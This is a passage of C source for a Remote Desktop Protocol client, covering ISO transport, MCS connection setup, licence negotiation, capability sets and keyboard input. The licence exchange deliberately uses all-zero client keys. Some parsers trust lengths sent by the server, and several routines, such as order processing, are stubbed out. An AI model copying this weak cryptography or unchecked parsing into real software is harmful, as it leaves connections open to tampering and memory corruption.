	if ((read(fd, buf, 1) != 1) || (buf[0] == 0))	/* Available? */
		goto err;

	if (read(fd, buf, 32) != 32)
		goto err;

	ret = True;

      err:
	close(fd);
	return ret;
}
#endif


/* Handles, for example, multi-scancode keypresses (which is not
   possible via keymap-files) */
BOOL
handle_special_keys(uint32 keysym, unsigned int state, uint32 ev_time, BOOL pressed)
{
	switch (keysym)
	{


		case XK_Break:
			/* Send Break sequence E0 46 E0 C6 */
			if (pressed)
			{
				rdp_send_scancode(ev_time, RDP_KEYPRESS,
						  (SCANCODE_EXTENDED | 0x46));
				rdp_send_scancode(ev_time, RDP_KEYPRESS,
						  (SCANCODE_EXTENDED | 0xc6));
			}
			/* No release sequence */
			return True;

		case XK_Pause:
			/* According to MS Keyboard Scan Code
			   Specification, pressing Pause should result
			   in E1 1D 45 E1 9D C5. I'm not exactly sure
			   of how this is supposed to be sent via
			   RDP. The code below seems to work, but with
			   the side effect that Left Ctrl stays
			   down. Therefore, we release it when Pause
			   is released. */
			if (pressed)
			{
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0xe1, 0);
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0x1d, 0);
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0x45, 0);
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0xe1, 0);
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0x9d, 0);
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYPRESS, 0xc5, 0);
			}
			else
			{
				/* Release Left Ctrl */
				rdp_send_input(ev_time, RDP_INPUT_SCANCODE, RDP_KEYRELEASE,
					       0x1d, 0);
			}
			return True;

		case XK_Meta_L:	/* Windows keys */
		case XK_Super_L:
		case XK_Hyper_L:
		case XK_Meta_R:
		case XK_Super_R:
		case XK_Hyper_R:
			if (pressed)
			{
				rdp_send_scancode(ev_time, RDP_KEYPRESS, SCANCODE_CHAR_LCTRL);
				rdp_send_scancode(ev_time, RDP_KEYPRESS, SCANCODE_CHAR_ESC);
			}
			else
			{
				rdp_send_scancode(ev_time, RDP_KEYRELEASE, SCANCODE_CHAR_ESC);
				rdp_send_scancode(ev_time, RDP_KEYRELEASE, SCANCODE_CHAR_LCTRL);
			}
			return True;
	}
	return False;
}





/* Send a self-contained ISO PDU */
static void
iso_send_msg(uint8 code)
{
	STREAM s;

	s = tcp_init(11);

	out_uint8(s, 3);	/* version */
	out_uint8(s, 0);	/* reserved */
	out_uint16_be(s, 11);	/* length */

	out_uint8(s, 6);	/* hdrlen */
	out_uint8(s, code);
	out_uint16(s, 0);	/* dst_ref */
	out_uint16(s, 0);	/* src_ref */
	out_uint8(s, 0);	/* class */

	s_mark_end(s);
	tcp_send(s);
}

/* Receive a message on the ISO layer, return code */
static STREAM
iso_recv_msg(uint8 * code)
{
	STREAM s;
	uint16 length;
	uint8 version;

	s = tcp_recv(4);
	if (s == NULL)
		return NULL;

	in_uint8(s, version);
	if (version != 3)
	{
		error("TPKT v%d\n", version);
		return NULL;
	}

	in_uint8s(s, 1);	/* pad */
	in_uint16_be(s, length);

	s = tcp_recv(length - 4);
	if (s == NULL)
		return NULL;

	in_uint8s(s, 1);	/* hdrlen */
	in_uint8(s, *code);

	if (*code == ISO_PDU_DT)
	{
		in_uint8s(s, 1);	/* eot */
		return s;
	}

	in_uint8s(s, 5);	/* dst_ref, src_ref, class */
	return s;
}

/* Initialise ISO transport data packet */
STREAM
iso_init(int length)
{
	STREAM s;

	s = tcp_init(length + 7);
	s_push_layer(s, iso_hdr, 7);

	return s;
}

/* Send an ISO data PDU */
void
iso_send(STREAM s)
{
	uint16 length;

	s_pop_layer(s, iso_hdr);
	length = s->end - s->p;

	out_uint8(s, 3);	/* version */
	out_uint8(s, 0);	/* reserved */
	out_uint16_be(s, length);

	out_uint8(s, 2);	/* hdrlen */
	out_uint8(s, ISO_PDU_DT);	/* code */
	out_uint8(s, 0x80);	/* eot */

	tcp_send(s);
}

/* Receive ISO transport data packet */
STREAM
iso_recv(void)
{
	STREAM s;
	uint8 code;

	s = iso_recv_msg(&code);
	if (s == NULL)
		return NULL;

	if (code != ISO_PDU_DT)
	{
		error("expected DT, got 0x%x\n", code);
		return NULL;
	}

	return s;
}

/* Establish a connection up to the ISO layer */
BOOL
iso_connect(char *server)
{
	uint8 code;

	if (!tcp_connect(server))
		return False;

	iso_send_msg(ISO_PDU_CR);

	if (iso_recv_msg(&code) == NULL)
		return False;

	if (code != ISO_PDU_CC)
	{
		error("expected CC, got 0x%x\n", code);
		tcp_disconnect();
		return False;
	}

	return True;
}

/* Disconnect from the ISO layer */
void
iso_disconnect(void)
{
	iso_send_msg(ISO_PDU_DR);
	tcp_disconnect();
}



/* Generate a session key and RC4 keys, given client and server randoms */
static void
licence_generate_keys(uint8 * client_key, uint8 * server_key, uint8 * client_rsa)
{
	uint8 session_key[48];
	uint8 temp_hash[48];

	/* Generate session key - two rounds of sec_hash_48 */
	sec_hash_48(temp_hash, client_rsa, client_key, server_key, 65);
	sec_hash_48(session_key, temp_hash, server_key, client_key, 65);

	/* Store first 16 bytes of session key, for generating signatures */
	memcpy(licence_sign_key, session_key, 16);

	/* Generate RC4 key */
	sec_hash_16(licence_key, &session_key[16], client_key, server_key);
}



/* Send a licence request packet */
static void
licence_send_request(uint8 * client_random, uint8 * rsa_data, char *user, char *host)
{
	uint32 sec_flags = SEC_LICENCE_NEG;
	uint16 userlen = strlen(user) + 1;
	uint16 hostlen = strlen(host) + 1;
	uint16 length = 128 + userlen + hostlen;
	STREAM s;

	s = sec_init(sec_flags, length + 2);

	out_uint16_le(s, LICENCE_TAG_REQUEST);
	out_uint16_le(s, length);

	out_uint32_le(s, 1);
	out_uint16(s, 0);
	out_uint16_le(s, 0xff01);

	out_uint8p(s, client_random, SEC_RANDOM_SIZE);
	out_uint16(s, 0);
	out_uint16_le(s, (SEC_MODULUS_SIZE + SEC_PADDING_SIZE));
	out_uint8p(s, rsa_data, SEC_MODULUS_SIZE);
	out_uint8s(s, SEC_PADDING_SIZE);

	out_uint16(s, LICENCE_TAG_USER);
	out_uint16(s, userlen);
	out_uint8p(s, user, userlen);

	out_uint16(s, LICENCE_TAG_HOST);
	out_uint16(s, hostlen);
	out_uint8p(s, host, hostlen);

	s_mark_end(s);
	sec_send(s, sec_flags);
}

/* Process a licence demand packet */
static void
licence_process_demand(STREAM s)
{
	uint8 null_data[SEC_MODULUS_SIZE];
	uint8 *server_random;
#ifdef SAVE_LICENCE
	uint8 signature[LICENCE_SIGNATURE_SIZE];
	uint8 hwid[LICENCE_HWID_SIZE];
	uint8 *licence_data;
	int licence_size;
	RC4_KEY crypt_key;
#endif

	/* Retrieve the server random from the incoming packet */
	in_uint8p(s, server_random, SEC_RANDOM_SIZE);

	/* We currently use null client keys. This is a bit naughty but, hey,
	   the security of licence negotiation isn't exactly paramount. */
	memset(null_data, 0, sizeof(null_data));
	licence_generate_keys(null_data, server_random, null_data);

#ifdef SAVE_LICENCE
	licence_size = load_licence(&licence_data);
	if (licence_size != -1)
	{
		/* Generate a signature for the HWID buffer */
		licence_generate_hwid(hwid);
		sec_sign(signature, 16, licence_sign_key, 16, hwid, sizeof(hwid));

		/* Now encrypt the HWID */
		RC4_set_key(&crypt_key, 16, licence_key);
		RC4(&crypt_key, sizeof(hwid), hwid, hwid);

		licence_present(null_data, null_data, licence_data, licence_size, hwid, signature);
		xfree(licence_data);
		return;
	}
#endif

	licence_send_request(null_data, null_data, username, hostname);
}


/* Process a licence packet */
void
licence_process(STREAM s)
{
	uint16 tag;

	in_uint16_le(s, tag);
	in_uint8s(s, 2);	/* length */

	switch (tag)
	{
		case LICENCE_TAG_DEMAND:

			licence_process_demand(s);
			break;

		case LICENCE_TAG_AUTHREQ:
//			licence_process_authreq(s);
			break;

		case LICENCE_TAG_ISSUE:
//			licence_process_issue(s);
			break;

		case LICENCE_TAG_REISSUE:
			break;

		case LICENCE_TAG_RESULT:
			break;


	}
}


/* Establish a connection up to the MCS layer */
BOOL
mcs_connect(char *server, STREAM mcs_data)
{
	if (!iso_connect(server))
		return False;

	mcs_send_connect_initial(mcs_data);
	if (!mcs_recv_connect_response(mcs_data))
		goto error;

	mcs_send_edrq();

	mcs_send_aurq();
	if (!mcs_recv_aucf(&mcs_userid))
		goto error;

	mcs_send_cjrq(mcs_userid + 1001);
	if (!mcs_recv_cjcf())
		goto error;

	mcs_send_cjrq(MCS_GLOBAL_CHANNEL);
	if (!mcs_recv_cjcf())
		goto error;

	return True;

      error:
	iso_disconnect();
	return False;
}

/* Disconnect from the MCS layer */
void
mcs_disconnect(void)
{
	iso_disconnect();
}



/* Initialise an MCS transport data packet */
STREAM
mcs_init(int length)
{
	STREAM s;

	s = iso_init(length + 8);
	s_push_layer(s, mcs_hdr, 8);

	return s;
}


/* Output a DOMAIN_PARAMS structure (ASN.1 BER) */
static void
mcs_out_domain_params(STREAM s, int max_channels, int max_users, int max_tokens, int max_pdusize)
{
	ber_out_header(s, MCS_TAG_DOMAIN_PARAMS, 32);
	ber_out_integer(s, max_channels);
	ber_out_integer(s, max_users);
	ber_out_integer(s, max_tokens);
	ber_out_integer(s, 1);	/* num_priorities */
	ber_out_integer(s, 0);	/* min_throughput */
	ber_out_integer(s, 1);	/* max_height */
	ber_out_integer(s, max_pdusize);
	ber_out_integer(s, 2);	/* ver_protocol */
}




/* Receive an MCS transport data packet */
STREAM
mcs_recv(void)
{
	uint8 opcode, appid, length;
	STREAM s;

	s = iso_recv();
	if (s == NULL)
		return NULL;

	in_uint8(s, opcode);
	appid = opcode >> 2;
	if (appid != MCS_SDIN)
	{
		if (appid != MCS_DPUM)
		{
			error("expected data, got %d\n", opcode);
		}
		return NULL;
	}

	in_uint8s(s, 5);	/* userid, chanid, flags */
	in_uint8(s, length);
	if (length & 0x80)
		in_uint8s(s, 1);	/* second byte of length */

	return s;
}



/* Expect a AUcf message (ASN.1 PER) */
static BOOL
mcs_recv_aucf(uint16 * mcs_userid)
{
	uint8 opcode, result;
	STREAM s;

	s = iso_recv();
	if (s == NULL)
		return False;

	in_uint8(s, opcode);
	if ((opcode >> 2) != MCS_AUCF)
	{
		error("expected AUcf, got %d\n", opcode);
		return False;
	}

	in_uint8(s, result);
	if (result != 0)
	{
		error("AUrq: %d\n", result);
		return False;
	}

	if (opcode & 2)
		in_uint16_be(s, *mcs_userid);

	return s_check_end(s);
}


/* Expect a CJcf message (ASN.1 PER) */
static BOOL
mcs_recv_cjcf(void)
{
	uint8 opcode, result;
	STREAM s;

	s = iso_recv();
	if (s == NULL)
		return False;

	in_uint8(s, opcode);
	if ((opcode >> 2) != MCS_CJCF)
	{
		error("expected CJcf, got %d\n", opcode);
		return False;
	}

	in_uint8(s, result);
	if (result != 0)
	{
		error("CJrq: %d\n", result);
		return False;
	}

	in_uint8s(s, 4);	/* mcs_userid, req_chanid */
	if (opcode & 2)
		in_uint8s(s, 2);	/* join_chanid */

	return s_check_end(s);
}


/* Parse a DOMAIN_PARAMS structure (ASN.1 BER) */
static BOOL
mcs_parse_domain_params(STREAM s)
{
	int length;

	ber_parse_header(s, MCS_TAG_DOMAIN_PARAMS, &length);
	in_uint8s(s, length);

	return s_check(s);
}


/* Expect a MCS_CONNECT_RESPONSE message (ASN.1 BER) */
static BOOL
mcs_recv_connect_response(STREAM mcs_data)
{
	uint8 result;
	int length;
	STREAM s;

	s = iso_recv();
	if (s == NULL)
		return False;

	ber_parse_header(s, MCS_CONNECT_RESPONSE, &length);

	ber_parse_header(s, BER_TAG_RESULT, &length);
	in_uint8(s, result);
	if (result != 0)
	{
		error("MCS connect: %d\n", result);
		return False;
	}

	ber_parse_header(s, BER_TAG_INTEGER, &length);
	in_uint8s(s, length);	/* connect id */

	mcs_parse_domain_params(s);

	ber_parse_header(s, BER_TAG_OCTET_STRING, &length);
	if (length > mcs_data->size)
	{
		error("MCS data length %d\n", length);
		length = mcs_data->size;
	}

	in_uint8a(s, mcs_data->data, length);
	mcs_data->p = mcs_data->data;
	mcs_data->end = mcs_data->data + length;

	return s_check_end(s);
}


/* Send an MCS transport data packet */
void
mcs_send(STREAM s)
{
	uint16 length;

	s_pop_layer(s, mcs_hdr);
	length = s->end - s->p - 8;
	length |= 0x8000;

	out_uint8(s, (MCS_SDRQ << 2));
	out_uint16_be(s, mcs_userid);
	out_uint16_be(s, MCS_GLOBAL_CHANNEL);
	out_uint8(s, 0x70);	/* flags */
	out_uint16_be(s, length);

	iso_send(s);
}


/* Send an AUrq message (ASN.1 PER) */
static void
mcs_send_aurq(void)
{
	STREAM s;

	s = iso_init(1);

	out_uint8(s, (MCS_AURQ << 2));

	s_mark_end(s);
	iso_send(s);
}


/* Send a CJrq message (ASN.1 PER) */
static void
mcs_send_cjrq(uint16 chanid)
{
	STREAM s;

	s = iso_init(5);

	out_uint8(s, (MCS_CJRQ << 2));
	out_uint16_be(s, mcs_userid);
	out_uint16_be(s, chanid);

	s_mark_end(s);
	iso_send(s);
}


/* Send an MCS_CONNECT_INITIAL message (ASN.1 BER) */
static void
mcs_send_connect_initial(STREAM mcs_data)
{
	int datalen = mcs_data->end - mcs_data->data;
	int length = 7 + 3 * 34 + 4 + datalen;
	STREAM s;

	s = iso_init(length + 5);

	ber_out_header(s, MCS_CONNECT_INITIAL, length);
	ber_out_header(s, BER_TAG_OCTET_STRING, 0);	/* calling domain */
	ber_out_header(s, BER_TAG_OCTET_STRING, 0);	/* called domain */

	ber_out_header(s, BER_TAG_BOOLEAN, 1);
	out_uint8(s, 0xff);	/* upward flag */

	mcs_out_domain_params(s, 2, 2, 0, 0xffff);	/* target params */
	mcs_out_domain_params(s, 1, 1, 1, 0x420);	/* min params */
	mcs_out_domain_params(s, 0xffff, 0xfc17, 0xffff, 0xffff);	/* max params */

	ber_out_header(s, BER_TAG_OCTET_STRING, datalen);
	out_uint8p(s, mcs_data->data, datalen);

	s_mark_end(s);
	iso_send(s);
}


/* Send an EDrq message (ASN.1 PER) */
static void
mcs_send_edrq(void)
{
	STREAM s;

	s = iso_init(5);

	out_uint8(s, (MCS_EDRQ << 2));
	out_uint16_be(s, 1);	/* height */
	out_uint16_be(s, 1);	/* interval */

	s_mark_end(s);
	iso_send(s);
}


/* Process data PDU */
static void
process_data_pdu(STREAM s)
{
	uint8 data_pdu_type;

	in_uint8s(s, 8);	/* shareid, pad, streamid, length */
	in_uint8(s, data_pdu_type);
	in_uint8s(s, 3);	/* compress_type, compress_len */

	switch (data_pdu_type)
	{
		case RDP_DATA_PDU_UPDATE:
			process_update_pdu(s);
			break;

		case RDP_DATA_PDU_POINTER:
			//process_pointer_pdu(s);
			break;

		case RDP_DATA_PDU_BELL:
			//ui_bell();
			break;

		case RDP_DATA_PDU_LOGON:
			/* User logged on */
			break;

	}
}


/* Respond to a demand active PDU */
static void
process_demand_active(STREAM s)
{
	uint8 type;

	in_uint32_le(s, rdp_shareid);



	rdp_send_confirm_active();
	rdp_send_synchronise();
	rdp_send_control(RDP_CTL_COOPERATE);
	rdp_send_control(RDP_CTL_REQUEST_CONTROL);
	rdp_recv(&type);	/* RDP_PDU_SYNCHRONIZE */
	rdp_recv(&type);	/* RDP_CTL_COOPERATE */
	rdp_recv(&type);	/* RDP_CTL_GRANT_CONTROL */
	rdp_send_input(0, RDP_INPUT_SYNCHRONIZE, 0, 0, 0);
	rdp_send_fonts(1);
	rdp_send_fonts(2);
	rdp_recv(&type);	/* RDP_PDU_UNKNOWN 0x28 */
	reset_order_state();
}


/* Process an order PDU */
void
process_orders(STREAM s)
{
	RDP_ORDER_STATE *os = &order_state;
	uint32 present;
	uint16 num_orders;
	uint8 order_flags;
	int size, processed = 0;
	BOOL delta;

	in_uint8s(s, 2);	/* pad */
	in_uint16_le(s, num_orders);
	in_uint8s(s, 2);	/* pad */

	while (processed < num_orders)
	{
		in_uint8(s, order_flags);

		if (!(order_flags & RDP_ORDER_STANDARD))
		{
			error("order parsing failed\n");
			break;
		}

		if (order_flags & RDP_ORDER_SECONDARY)
		{
			process_secondary_order(s);
		}
		else
		{
			if (order_flags & RDP_ORDER_CHANGE)
			{
				in_uint8(s, os->order_type);
			}

			switch (os->order_type)
			{
				case RDP_ORDER_TRIBLT:
				case RDP_ORDER_TEXT2:
					size = 3;
					break;

				case RDP_ORDER_PATBLT:
				case RDP_ORDER_MEMBLT:
				case RDP_ORDER_LINE:
					size = 2;
					break;

				default:
					size = 1;
			}


			delta = order_flags & RDP_ORDER_DELTA;

		}
		processed++;
	}

	if (s->p != next_packet)
		error("%d bytes remaining\n", (int) (next_packet - s->p));
}


/* Process a secondary order */
static void
process_secondary_order(STREAM s)
{
	uint16 length;
	uint8 type;
	uint8 *next_order;

	in_uint16_le(s, length);
	in_uint8s(s, 2);	/* flags */
	in_uint8(s, type);
	next_order = s->p + length + 7;
	s->p = next_order;
}


/* Process an update PDU */
static void
process_update_pdu(STREAM s)
{
	uint16 update_type;

	in_uint16_le(s, update_type);

	switch (update_type)
	{
		case RDP_UPDATE_ORDERS:
			process_orders(s);
			break;

		case RDP_UPDATE_SYNCHRONIZE:
			break;
	}
}


/* Initialise an RDP packet */
static STREAM
rdp_init(int maxlen)
{
	STREAM s;

	s = sec_init(encryption ? SEC_ENCRYPT : 0, maxlen + 6);
	s_push_layer(s, rdp_hdr, 6);

	return s;
}

/* Send an RDP packet */
static void
rdp_send(STREAM s, uint8 pdu_type)
{
	uint16 length;

	s_pop_layer(s, rdp_hdr);
	length = s->end - s->p;

	out_uint16_le(s, length);
	out_uint16_le(s, (pdu_type | 0x10));	/* Version 1 */
	out_uint16_le(s, (mcs_userid + 1001));

	sec_send(s, encryption ? SEC_ENCRYPT : 0);
}

/* Receive an RDP packet */
static STREAM
rdp_recv(uint8 * type)
{
	static STREAM rdp_s;
	uint16 length, pdu_type;

	if ((rdp_s == NULL) || (next_packet >= rdp_s->end))
	{
		rdp_s = sec_recv();
		if (rdp_s == NULL)
			return NULL;

		next_packet = rdp_s->p;
	}
	else
	{
		rdp_s->p = next_packet;
	}

	in_uint16_le(rdp_s, length);
	/* 32k packets are really 8, keepalive fix */
	if (length == 0x8000)
	{
		next_packet += 8;
		*type = 0;
		return rdp_s;
	}
	in_uint16_le(rdp_s, pdu_type);
	in_uint8s(rdp_s, 2);	/* userid */
	*type = pdu_type & 0xf;


	next_packet += length;
	return rdp_s;
}

/* Initialise an RDP data packet */
static STREAM
rdp_init_data(int maxlen)
{
	STREAM s;

	s = sec_init(encryption ? SEC_ENCRYPT : 0, maxlen + 18);
	s_push_layer(s, rdp_hdr, 18);

	return s;
}

/* Send an RDP data packet */
static void
rdp_send_data(STREAM s, uint8 data_pdu_type)
{
	uint16 length;

	s_pop_layer(s, rdp_hdr);
	length = s->end - s->p;

	out_uint16_le(s, length);
	out_uint16_le(s, (RDP_PDU_DATA | 0x10));
	out_uint16_le(s, (mcs_userid + 1001));

	out_uint32_le(s, rdp_shareid);
	out_uint8(s, 0);	/* pad */
	out_uint8(s, 1);	/* streamid */
	out_uint16_le(s, (length - 14));
	out_uint8(s, data_pdu_type);
	out_uint8(s, 0);	/* compress_type */
	out_uint16(s, 0);	/* compress_len */

	sec_send(s, encryption ? SEC_ENCRYPT : 0);
}

/* Output a string in Unicode */
void
rdp_out_unistr(STREAM s, char *string, int len)
{
	int i = 0, j = 0;

	len += 2;

	while (i < len)
	{
		s->p[i++] = string[j++];
		s->p[i++] = 0;
	}

	s->p += len;
}

/* Parse a logon info packet */
static void
rdp_send_logon_info(uint32 flags, char *domain, char *user,
		    char *password, char *program, char *directory)
{
	int len_domain = 2 * strlen(domain);
	int len_user = 2 * strlen(user);
	int len_password = 2 * strlen(password);
	int len_program = 2 * strlen(program);
	int len_directory = 2 * strlen(directory);
	uint32 sec_flags = encryption ? (SEC_LOGON_INFO | SEC_ENCRYPT) : SEC_LOGON_INFO;
	STREAM s;

	s = sec_init(sec_flags, 18 + len_domain + len_user + len_password
		     + len_program + len_directory + 10);

	out_uint32(s, 0);
	out_uint32_le(s, flags);
	out_uint16_le(s, len_domain);
	out_uint16_le(s, len_user);
	out_uint16_le(s, len_password);
	out_uint16_le(s, len_program);
	out_uint16_le(s, len_directory);
	rdp_out_unistr(s, domain, len_domain);
	rdp_out_unistr(s, user, len_user);
	rdp_out_unistr(s, password, len_password);
	rdp_out_unistr(s, program, len_program);
	rdp_out_unistr(s, directory, len_directory);

	s_mark_end(s);
	sec_send(s, sec_flags);
}

/* Send a control PDU */
static void
rdp_send_control(uint16 action)
{
	STREAM s;

	s = rdp_init_data(8);

	out_uint16_le(s, action);
	out_uint16(s, 0);	/* userid */
	out_uint32(s, 0);	/* control id */

	s_mark_end(s);
	rdp_send_data(s, RDP_DATA_PDU_CONTROL);
}

/* Send a synchronisation PDU */
static void
rdp_send_synchronise(void)
{
	STREAM s;

	s = rdp_init_data(4);

	out_uint16_le(s, 1);	/* type */
	out_uint16_le(s, 1002);

	s_mark_end(s);
	rdp_send_data(s, RDP_DATA_PDU_SYNCHRONISE);
}

/* Send a single input event */
void
rdp_send_input(uint32 time, uint16 message_type, uint16 device_flags, uint16 param1, uint16 param2)
{
	STREAM s;

	s = rdp_init_data(16);

	out_uint16_le(s, 1);	/* number of events */
	out_uint16(s, 0);	/* pad */

	out_uint32_le(s, time);
	out_uint16_le(s, message_type);
	out_uint16_le(s, device_flags);
	out_uint16_le(s, param1);
	out_uint16_le(s, param2);

	s_mark_end(s);
	rdp_send_data(s, RDP_DATA_PDU_INPUT);
}

/* Send an (empty) font information PDU */
static void
rdp_send_fonts(uint16 seq)
{
	STREAM s;

	s = rdp_init_data(8);

	out_uint16(s, 0);	/* number of fonts */
	out_uint16_le(s, 0x3e);	/* unknown */
	out_uint16_le(s, seq);	/* unknown */
	out_uint16_le(s, 0x32);	/* entry size */

	s_mark_end(s);
	rdp_send_data(s, RDP_DATA_PDU_FONT2);
}

/* Output general capability set */
static void
rdp_out_general_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_GENERAL);
	out_uint16_le(s, RDP_CAPLEN_GENERAL);

	out_uint16_le(s, 1);	/* OS major type */
	out_uint16_le(s, 3);	/* OS minor type */
	out_uint16_le(s, 0x200);	/* Protocol version */
	out_uint16(s, 0);	/* Pad */
	out_uint16(s, 0);	/* Compression types */
	out_uint16(s, 0);	/* Pad */
	out_uint16(s, 0);	/* Update capability */
	out_uint16(s, 0);	/* Remote unshare capability */
	out_uint16(s, 0);	/* Compression level */
	out_uint16(s, 0);	/* Pad */
}

/* Output bitmap capability set */
static void
rdp_out_bitmap_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_BITMAP);
	out_uint16_le(s, RDP_CAPLEN_BITMAP);

	out_uint16_le(s, 8);	/* Preferred BPP */
	out_uint16_le(s, 1);	/* Receive 1 BPP */
	out_uint16_le(s, 1);	/* Receive 4 BPP */
	out_uint16_le(s, 1);	/* Receive 8 BPP */
	out_uint16_le(s, 800);	/* Desktop width */
	out_uint16_le(s, 600);	/* Desktop height */
	out_uint16(s, 0);	/* Pad */
	out_uint16(s, 0);	/* Allow resize */
	out_uint16_le(s, bitmap_compression ? 1 : 0);	/* Support compression */
	out_uint16(s, 0);	/* Unknown */
	out_uint16_le(s, 1);	/* Unknown */
	out_uint16(s, 0);	/* Pad */
}

/* Output order capability set */
static void
rdp_out_order_caps(STREAM s)
{
	uint8 order_caps[32];


	memset(order_caps, 0, 32);
	order_caps[0] = 1;	/* dest blt */
	order_caps[1] = 1;	/* pat blt */
	order_caps[2] = 1;	/* screen blt */
	order_caps[3] = 1;	/* required for memblt? */
	order_caps[8] = 1;	/* line */
	order_caps[9] = 1;	/* line */
	order_caps[10] = 1;	/* rect */
	order_caps[11] = (desktop_save == False ? 0 : 1);	/* desksave */
	order_caps[13] = 1;	/* memblt */
	order_caps[14] = 1;	/* triblt */
	order_caps[22] = 1;	/* polyline */
	order_caps[27] = 1;	/* text2 */
	out_uint16_le(s, RDP_CAPSET_ORDER);
	out_uint16_le(s, RDP_CAPLEN_ORDER);

	out_uint8s(s, 20);	/* Terminal desc, pad */
	out_uint16_le(s, 1);	/* Cache X granularity */
	out_uint16_le(s, 20);	/* Cache Y granularity */
	out_uint16(s, 0);	/* Pad */
	out_uint16_le(s, 1);	/* Max order level */
	out_uint16_le(s, 0x147);	/* Number of fonts */
	out_uint16_le(s, 0x2a);	/* Capability flags */
	out_uint8p(s, order_caps, 32);	/* Orders supported */
	out_uint16_le(s, 0x6a1);	/* Text capability flags */
	out_uint8s(s, 6);	/* Pad */
	out_uint32_le(s, desktop_save == False ? 0 : 0x38400);	/* Desktop cache size */
	out_uint32(s, 0);	/* Unknown */
	out_uint32_le(s, 0x4e4);	/* Unknown */
}

/* Output bitmap cache capability set */
static void
rdp_out_bmpcache_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_BMPCACHE);
	out_uint16_le(s, RDP_CAPLEN_BMPCACHE);

	out_uint8s(s, 24);	/* unused */
	out_uint16_le(s, 0x258);	/* entries */
	out_uint16_le(s, 0x100);	/* max cell size */
	out_uint16_le(s, 0x12c);	/* entries */
	out_uint16_le(s, 0x400);	/* max cell size */
	out_uint16_le(s, 0x106);	/* entries */
	out_uint16_le(s, 0x1000);	/* max cell size */
}

/* Output control capability set */
static void
rdp_out_control_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_CONTROL);
	out_uint16_le(s, RDP_CAPLEN_CONTROL);

	out_uint16(s, 0);	/* Control capabilities */
	out_uint16(s, 0);	/* Remote detach */
	out_uint16_le(s, 2);	/* Control interest */
	out_uint16_le(s, 2);	/* Detach interest */
}

/* Output activation capability set */
static void
rdp_out_activate_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_ACTIVATE);
	out_uint16_le(s, RDP_CAPLEN_ACTIVATE);

	out_uint16(s, 0);	/* Help key */
	out_uint16(s, 0);	/* Help index key */
	out_uint16(s, 0);	/* Extended help key */
	out_uint16(s, 0);	/* Window activate */
}

/* Output pointer capability set */
static void
rdp_out_pointer_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_POINTER);
	out_uint16_le(s, RDP_CAPLEN_POINTER);

	out_uint16(s, 0);	/* Colour pointer */
	out_uint16_le(s, 20);	/* Cache size */
}

/* Output share capability set */
static void
rdp_out_share_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_SHARE);
	out_uint16_le(s, RDP_CAPLEN_SHARE);

	out_uint16(s, 0);	/* userid */
	out_uint16(s, 0);	/* pad */
}

/* Output colour cache capability set */
static void
rdp_out_colcache_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_COLCACHE);
	out_uint16_le(s, RDP_CAPLEN_COLCACHE);

	out_uint16_le(s, 6);	/* cache size */
	out_uint16(s, 0);	/* pad */
}

static uint8 canned_caps[] = {
	0x01, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x04,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0x00, 0x08, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x0E, 0x00, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x10, 0x00, 0x34, 0x00, 0xFE,
	0x00, 0x04, 0x00, 0xFE, 0x00, 0x04, 0x00, 0xFE, 0x00, 0x08, 0x00,
	0xFE, 0x00, 0x08, 0x00, 0xFE,
	0x00, 0x10, 0x00, 0xFE, 0x00, 0x20, 0x00, 0xFE, 0x00, 0x40, 0x00,
	0xFE, 0x00, 0x80, 0x00, 0xFE,
	0x00, 0x00, 0x01, 0x40, 0x00, 0x00, 0x08, 0x00, 0x01, 0x00, 0x01,
	0x02, 0x00, 0x00, 0x00
};

/* Output unknown capability set */
static void
rdp_out_unknown_caps(STREAM s)
{
	out_uint16_le(s, RDP_CAPSET_UNKNOWN);
	out_uint16_le(s, 0x58);

	out_uint8p(s, canned_caps, RDP_CAPLEN_UNKNOWN - 4);
}

/* Send a confirm active PDU */
static void
rdp_send_confirm_active(void)
{
	STREAM s;
	uint16 caplen =
		RDP_CAPLEN_GENERAL + RDP_CAPLEN_BITMAP + RDP_CAPLEN_ORDER +
		RDP_CAPLEN_BMPCACHE + RDP_CAPLEN_COLCACHE +
		RDP_CAPLEN_ACTIVATE + RDP_CAPLEN_CONTROL +
		RDP_CAPLEN_POINTER + RDP_CAPLEN_SHARE + RDP_CAPLEN_UNKNOWN + 4 /* w2k fix, why? */ ;

	s = rdp_init(14 + caplen + sizeof(RDP_SOURCE));

	out_uint32_le(s, rdp_shareid);
	out_uint16_le(s, 0x3ea);	/* userid */
	out_uint16_le(s, sizeof(RDP_SOURCE));
	out_uint16_le(s, caplen);

	out_uint8p(s, RDP_SOURCE, sizeof(RDP_SOURCE));
	out_uint16_le(s, 0xd);	/* num_caps */
	out_uint8s(s, 2);	/* pad */

	rdp_out_general_caps(s);
	rdp_out_bitmap_caps(s);
